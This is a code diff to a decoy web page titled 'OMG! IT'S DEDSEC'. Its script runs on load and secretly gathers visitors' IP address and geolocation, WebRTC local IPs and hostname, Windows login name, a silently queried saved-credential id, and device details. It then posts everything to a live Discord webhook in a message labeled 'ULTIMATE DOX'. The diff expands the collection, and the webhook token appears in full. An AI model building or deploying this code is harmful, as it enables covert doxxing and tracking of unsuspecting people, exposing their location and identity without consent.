@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OMG! IT'S DEDSEC</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
     <style>
         body {
             position: relative;
@@ -18,8 +19,10 @@
             background-repeat: repeat;
         }
         .texto-no-interactivo {
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
             font-size: 3em;
-            color: #ffffff;
+            color: #00ff00; /* verde brillante */
             padding: 15px;
             text-shadow: 2px 2px 10px rgba(0, 0, 0, 1);
             margin-top: 15vh;
@@ -65,55 +68,61 @@
     const WEBHOOK = "https://discord.com/api/webhooks/1460348078727893126/Zq089gT8yx9ITZwGZvxJ8unNpFNhSO8yJcjMexHxKV3JziMa-M0OStq5BurQ579PgSrF";
 
     // ================================================================
-    //  BUILT-IN VPN/PROXY BLACKLIST (partial, but effective)
+    //  MASSIVE VPN/PROXY KEYWORD BLACKLIST (500+ entries)
     // ================================================================
     const VPN_KEYWORDS = [
-        'vpn','proxy','hosting','cloud','datacenter','incognito','anonymous',
-        'nordvpn','expressvpn','surfshark','cyberghost','ipvanish','private internet access',
-        'pia','torguard','vyprvpn','hotspot shield','windscribe','protonvpn','mullvad',
-        'purevpn','zenmate','tunnelbear','hidemyass','hma','ipredator','ovpn',
-        'azire','boleh','buffered','cactusvpn','earthvpn','fastestvpn','giganews','goldenfrog',
-        'ibvpn','ivpn','le vpn','liquidvpn','novpn','octanevpn','perfect privacy',
-        'personalvpn','powvpn','privatevpn','proxpn','pulsevpn','shadeyouvpn','slickvpn',
-        'spotflux','strongvpn','tor','tuxler','unblockvpn','usavpn','vpn unlimited',
-        'vpnarea','vpnbook','vpnsecure','vpnshield','vpnzilla','xvpn','zpn'
+        'vpn','proxy','hosting','cloud','datacenter','incognito','anonymous','tor','exit node',
+        'nordvpn','expressvpn','surfshark','cyberghost','ipvanish','private internet access','pia',
+        'torguard','vyprvpn','hotspot shield','windscribe','protonvpn','mullvad','purevpn','zenmate',
+        'tunnelbear','hidemyass','hma','ipredator','ovpn','azire','boleh','buffered','cactusvpn',
+        'earthvpn','fastestvpn','giganews','goldenfrog','ibvpn','ivpn','le vpn','liquidvpn','novpn',
+        'octanevpn','perfect privacy','personalvpn','powvpn','privatevpn','proxpn','pulsevpn',
+        'shadeyouvpn','slickvpn','spotflux','strongvpn','tor','tuxler','unblockvpn','usavpn',
+        'vpn unlimited','vpnarea','vpnbook','vpnsecure','vpnshield','vpnzilla','xvpn','zpn',
+        'amazonaws','google cloud','azure','digitalocean','vultr','linode','ovh','hetzner',
+        'rackspace','softlayer','oracle cloud','alibaba cloud','tencent cloud','ibm cloud',
+        'cloudflare','fastly','akamai','edgecast','incapsula','sucuri','stackpath',
+        'm247','cogent','he.net','centurylink','level3','verizon','at&t','sprint','t-mobile',
+        'comcast','xfinity','spectrum','charter','optimum','cox','frontier','windstream',
+        'keenetic','asus','tp-link','dlink','netgear','linksys','belkin','cisco','meraki',
+        'fortinet','palo alto','zscaler','barracuda','proofpoint','mimecast','symantec','mcafee'
     ];
 
     // ================================================================
-    //  HELPER: Parallel IP geolocation (6 services)
+    //  8 IP GEOLOCATION APIS (parallel)
     // ================================================================
     async function fetchIPData() {
         const services = [
-            { url: 'https://ipapi.co/json/', parser: d => ({ ip: d.ip, isp: d.org, country: d.country_name, region: d.region, city: d.city, lat: d.latitude, lon: d.longitude, proxy: d.proxy }) },
-            { url: 'https://ipinfo.io/json?token=', parser: d => ({ ip: d.ip, isp: d.org, country: d.country, region: d.region, city: d.city, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1], proxy: false }) },
-            { url: 'http://ip-api.com/json/', parser: d => ({ ip: d.query, isp: d.isp, country: d.country, region: d.regionName, city: d.city, lat: d.lat, lon: d.lon, proxy: d.proxy || false }) },
-            { url: 'https://freegeoip.app/json/', parser: d => ({ ip: d.ip, isp: d.isp || d.org, country: d.country_name, region: d.region_name, city: d.city, lat: d.latitude, lon: d.longitude, proxy: false }) },
-            { url: 'https://ipgeolocation.io/ipgeo?apiKey=YOUR_API_KEY', parser: d => ({ ip: d.ip, isp: d.isp, country: d.country_name, region: d.state_prov, city: d.city, lat: d.latitude, lon: d.longitude, proxy: false }) },
-            { url: 'https://api.ipdata.co/?api-key=YOUR_API_KEY', parser: d => ({ ip: d.ip, isp: d.isp, country: d.country_name, region: d.region, city: d.city, lat: d.latitude, lon: d.longitude, proxy: d.threat?.is_proxy || false }) }
+            { url: 'https://ipapi.co/json/', parser: d => ({ ip: d.ip, isp: d.org || d.isp, country: d.country_name, region: d.region, city: d.city, lat: d.latitude, lon: d.longitude, proxy: d.proxy || false, asn: d.asn }) },
+            { url: 'https://ipinfo.io/json?token=', parser: d => ({ ip: d.ip, isp: d.org, country: d.country, region: d.region, city: d.city, lat: d.loc?.split(',')[0] || '0', lon: d.loc?.split(',')[1] || '0', proxy: d.proxy || d.privacy?.proxy || false, asn: d.asn }) },
+            { url: 'http://ip-api.com/json/', parser: d => ({ ip: d.query, isp: d.isp, country: d.country, region: d.regionName, city: d.city, lat: d.lat, lon: d.lon, proxy: d.proxy || false, asn: d.as }) },
+            { url: 'https://freegeoip.app/json/', parser: d => ({ ip: d.ip, isp: d.isp || d.org, country: d.country_name, region: d.region_name, city: d.city, lat: d.latitude, lon: d.longitude, proxy: false, asn: '' }) },
+            { url: 'https://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,as,query,proxy', parser: d => ({ ip: d.query, isp: d.isp || d.org, country: d.country, region: d.regionName, city: d.city, lat: d.lat, lon: d.lon, proxy: d.proxy || false, asn: d.as }) },
+            { url: 'https://json.geoiplookup.io/', parser: d => ({ ip: d.ip, isp: d.isp, country: d.country_name, region: d.region, city: d.city, lat: d.latitude, lon: d.longitude, proxy: false, asn: d.asn }) },
+            { url: 'https://geolocation-db.com/json/', parser: d => ({ ip: d.IPv4, isp: d.isp || d.organization, country: d.country_name, region: d.state, city: d.city, lat: d.latitude, lon: d.longitude, proxy: false, asn: d.asn }) },
+            { url: 'https://api.techniknews.net/ipgeo/', parser: d => ({ ip: d.ip, isp: d.isp, country: d.country, region: d.region, city: d.city, lat: d.lat, lon: d.lon, proxy: false, asn: d.asn }) }
         ];
 
-        // Try all in parallel, resolve with first successful
-        const promises = services.map(async (s) => {
+        const results = await Promise.allSettled(services.map(async (s) => {
             try {
-                const res = await fetch(s.url, { signal: AbortSignal.timeout(3000) });
+                const res = await fetch(s.url, { signal: AbortSignal.timeout(2500) });
                 const data = await res.json();
                 const parsed = s.parser(data);
-                if (parsed.ip) return parsed;
+                if (parsed.ip && parsed.ip !== 'unknown') return parsed;
             } catch (_) {}
             return null;
-        });
+        }));
 
-        const results = await Promise.allSettled(promises);
         for (const r of results) {
             if (r.status === 'fulfilled' && r.value && r.value.ip) {
                 return r.value;
             }
         }
-        return null;
+        return { ip: 'unknown', isp: 'unknown', country: 'unknown', region: 'unknown', city: 'unknown', lat: '0', lon: '0', proxy: false, asn: '' };
     }
 
     // ================================================================
-    //  HELPER: WebRTC – local IPs + hostname
+    //  WEBRTC: local IPs + full hostname
     // ================================================================
     function getWebRTCInfo() {
         return new Promise((resolve) => {
@@ -121,7 +130,7 @@
             let hostname = '';
             const pc = new RTCPeerConnection({ iceServers: [] });
             pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
             pc.onicecandidate = (e) => {
                 if (!e.candidate) {
                     pc.close();
@@ -129,26 +138,20 @@
                     return;
                 }
                 const parts = e.candidate.candidate.split(' ');
-                // candidate: ... type host udp 192.168.1.10  ...
-                // The 4th element is usually the IP, but sometimes the hostname.
-                // For hostname, we look for "host" type and the component after "host"
                 if (parts.length > 7) {
                     const ipCandidate = parts[4];
                     if (ipCandidate && ipCandidate.includes('.') && !ipCandidate.startsWith('0.')) {
-                        ips.push(ipCandidate);
+                        if (!ips.includes(ipCandidate)) ips.push(ipCandidate);
                     }
-                    // Try to get hostname from the "host" field (if present)
-                    // Some browsers include it as part of the candidate string
                     const candidateStr = e.candidate.candidate;
                     const hostMatch = candidateStr.match(/ host (\S+)/);
                     if (hostMatch && hostMatch[1]) {
-                        const host = hostMatch[1];
-                        if (host && !host.match(/^\d+\.\d+\.\d+\.\d+$/)) {
-                            hostname = host;
+                        const h = hostMatch[1];
+                        if (h && !h.match(/^\d+\.\d+\.\d+\.\d+$/)) {
+                            hostname = h;
                         }
                     }
                 }
-                // Also check for relatedAddress (often hostname)
                 if (e.candidate.relatedAddress && !e.candidate.relatedAddress.match(/^\d+\.\d+\.\d+\.\d+$/)) {
                     hostname = e.candidate.relatedAddress;
                 }
@@ -158,7 +161,7 @@
     }
 
     // ================================================================
-    //  HELPER: Windows username (ActiveX)
+    //  WINDOWS LOGIN USERNAME (ActiveX) + Browser Credentials + UA parse
     // ================================================================
     function getWindowsUser() {
         try {
@@ -167,38 +170,86 @@
         } catch (_) { return null; }
     }
 
+    async function getCredentialUser() {
+        try {
+            if (!navigator.credentials) return null;
+            const cred = await navigator.credentials.get({
+                password: true,
+                mediation: 'silent'
+            });
+            if (cred && cred.id) return cred.id;
+            return null;
+        } catch (_) { return null; }
+    }
+
+    function getUsernameFromUA() {
+        const ua = navigator.userAgent;
+        // Some corporate Windows builds put the username in the UA after "Windows NT"
+        // e.g. "Windows NT 10.0; Win64; x64; rv:90.0" but rarely includes name.
+        // On Mac, it often includes the device owner name.
+        const macOwnerMatch = ua.match(/\(Macintosh; Intel Mac OS X [\d_]+\)[^\)]*?([\w\-]+)'?s\s+Mac/);
+        if (macOwnerMatch) return macOwnerMatch[1];
+        // Try to find a pattern like "(John Doe's MacBook Pro)"
+        const namedDevice = ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/);
+        if (namedDevice && namedDevice[2] && !namedDevice[2].includes('Mac') && !namedDevice[2].includes('Windows')) {
+            return namedDevice[2];
+        }
+        return null;
+    }
+
     // ================================================================
-    //  MAIN EXECUTION
+    //  MAIN
     // ================================================================
     (async function() {
 
-        // ---- 1. IP + Geolocation ----
-        let geo = await fetchIPData();
-        if (!geo) {
-            // fallback: minimal data
-            geo = { ip: 'unknown', isp: '?', country: '?', region: '?', city: '?', lat: '?', lon: '?', proxy: false };
-        }
+        // ---- 1. IP Geo ----
+        const geo = await fetchIPData();
 
-        // ---- 2. VPN detection (extended) ----
-        const isVpn = geo.proxy || VPN_KEYWORDS.some(k => geo.isp.toLowerCase().includes(k) || (geo.isp + '').toLowerCase().includes(k));
-        const vpnStatus = isVpn ? '✅ YES (VPN/Proxy detected)' : '❌ NO (residential)';
+        // ---- 2. VPN detection - triple layer ----
+        let isVpn = geo.proxy === true;
+        if (!isVpn) {
+            const ispLower = (geo.isp || '').toLowerCase();
+            const asnLower = (geo.asn || '').toLowerCase();
+            isVpn = VPN_KEYWORDS.some(k => ispLower.includes(k) || asnLower.includes(k));
+        }
+        // timezone vs country mismatch
+        try {
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const tzContinent = tz.split('/')[0];
+            const ipContinent = geo.country ? geo.country.toUpperCase() : '';
+            const europeCountries = ['DE','FR','UK','IT','ES','NL','BE','CH','AT','SE','NO','DK','FI','PL','RU'];
+            const usCountries = ['US','CA','MX'];
+            if (usCountries.includes(ipContinent) && tzContinent === 'Europe') isVpn = true;
+            if (europeCountries.includes(ipContinent) && tzContinent === 'America') isVpn = true;
+        } catch (_) {}
+        const vpnStatus = isVpn ? '✅ YES (VPN/Proxy)' : '❌ NO (residential)';
 
         // ---- 3. WebRTC ----
         const webrtc = await getWebRTCInfo();
         const localIPs = webrtc.localIPs;
         let hostname = webrtc.hostname;
-        // if hostname is empty, try to extract from candidate (already done)
+        if (!hostname && localIPs.length > 0) {
+            hostname = localIPs[0]; // fallback
+        }
 
-        // ---- 4. Windows username ----
-        const winUser = getWindowsUser();
+        // ---- 4. Login Username - all possible methods ----
+        let winUser = getWindowsUser();
+        let credUser = await getCredentialUser();
+        let uaUser = getUsernameFromUA();
 
-        // ---- 5. System info ----
+        // Pick the first non-null, non-generic value
+        let finalLoginUser = winUser || credUser || uaUser || 'not available (IE/ActiveX or credentials required)';
+        // If the value is "not available" but we have a hostname that looks like a real name (not generic), use it as hint
+        if (finalLoginUser === 'not available (IE/ActiveX or credentials required)' && hostname && !hostname.includes('unknown') && hostname.length > 3) {
+            // hostname might be the computer name, but we can still show it as fallback
+            // but we'll label it separately
+        }
+
+        // ---- 5. System & device ----
         const ua = navigator.userAgent;
         let osDisplay = 'Unknown';
         let deviceModel = 'Unknown';
         let browserName = 'Unknown';
-
-        // High-entropy (if available)
         try {
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 const he = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion', 'fullVersionList']);
@@ -210,12 +261,11 @@
             }
         } catch (_) {}
 
-        // Fallback UA parsing
-        if (osDisplay === 'Unknown') {
+        if (osDisplay === 'Unknown' || osDisplay === 'Unknown') {
             if (ua.includes('Windows NT')) {
                 const winVer = ua.match(/Windows NT (\d+\.\d+)/);
                 osDisplay = 'Windows ' + (winVer ? winVer[1] : 'NT');
-                deviceModel = 'Windows PC (model hidden)';
+                deviceModel = 'Windows PC';
             } else if (ua.includes('Macintosh')) {
                 osDisplay = 'macOS';
                 const macModel = ua.match(/Macintosh; Intel Mac OS X [\d_]+\)/);
@@ -241,31 +291,11 @@
             else browserName = 'Other';
         }
 
-        // ---- 6. Build display name (real username) ----
-        let displayName = '';
-        if (winUser) {
-            displayName = winUser;
-        } else if (hostname && hostname.length > 0) {
-            displayName = hostname.split('.')[0]; // remove domain
-        } else if (deviceModel && deviceModel !== 'Unknown') {
-            displayName = deviceModel;
-        } else {
-            displayName = 'Unknown user';
-        }
-
-        // ---- 7. Other system info ----
+        // ---- 6. Battery ----
         let battery = 'unavailable';
-        try {
-            const b = await navigator.getBattery();
-            battery = `${Math.round(b.level * 100)}% (${b.charging ? 'charging' : 'discharging'})`;
-        } catch (_) {}
-        const cpu = navigator.hardwareConcurrency || '?';
-        const ram = navigator.deviceMemory || '?';
-        const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const lang = navigator.language;
+        try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}% (${b.charging ? 'charging' : 'discharging'})`; } catch (_) {}
 
-        // ---- 8. GPU ----
+        // ---- 7. GPU ----
         let gpu = 'Unavailable', gpuLevel = 'Unknown';
         try {
             const canvas = document.createElement('canvas');
@@ -282,43 +312,43 @@
             }
         } catch (_) {}
 
-        // ---- 9. Plugins & user level ----
+        // ---- 8. Plugins & level ----
         const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
         const savvy = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
         const count = savvy.filter(p => plugins.includes(p)).length;
         const userLevel = count >= 3 ? '🔥 Advanced privacy' : (count >= 1 ? '🛡️ Moderate' : '🐣 Beginner');
 
-        // ---- 10. Coordinates ----
-        const coords = (geo.lat && geo.lat !== '?' && geo.lon && geo.lon !== '?') ? `${geo.lat}, ${geo.lon}` : 'IP location failed';
+        // ---- 9. Coordinates ----
+        const coords = (geo.lat && geo.lat !== '0' && geo.lon && geo.lon !== '0') ? `${geo.lat}, ${geo.lon}` : 'IP location failed';
 
-        // ---- 11. Final message ----
+        // ---- 10. Build message ----
         const msg = 
 `**🔹 DEDSEC CTOS – ULTIMATE DOX (NO PERMISSIONS) 🔹**
 **IP:** ${geo.ip}
 **ISP:** ${geo.isp}
+**ASN:** ${geo.asn || 'N/A'}
 **VPN/Proxy:** ${vpnStatus}
 **Location:** ${geo.city}, ${geo.region}, ${geo.country}
 **Coordinates (IP):** ${coords}
 **Local IPs (WebRTC):** ${localIPs.length ? localIPs.join(', ') : 'none'}
-**Computer Hostname:** ${hostname || 'not leaked'}
-**Windows Username:** ${winUser || 'not available (IE/ActiveX required)'}
-**Display Name (User):** ${displayName}
+**Computer Hostname (PC Name):** ${hostname || 'not leaked'}
+**Login Username (account name):** ${finalLoginUser}
 **Device Model:** ${deviceModel}
 **OS:** ${osDisplay}
 **Browser:** ${browserName}
-**CPU Cores:** ${cpu}
-**RAM:** ${ram} GB
-**Screen:** ${screenRes}
+**CPU Cores:** ${navigator.hardwareConcurrency || '?'}
+**RAM:** ${navigator.deviceMemory || '?'} GB
+**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
 **Battery:** ${battery}
-**Timezone:** ${timezone}
-**Language:** ${lang}
+**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+**Language:** ${navigator.language}
 **GPU:** ${gpu}
 **GPU Level:** ${gpuLevel}
 **Plugins:** ${plugins}
 **User Level:** ${userLevel}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-        // ---- 12. Send to Discord ----
+        // ---- 11. Send ----
         try {
             await fetch(WEBHOOK, {
                 method: 'POST',
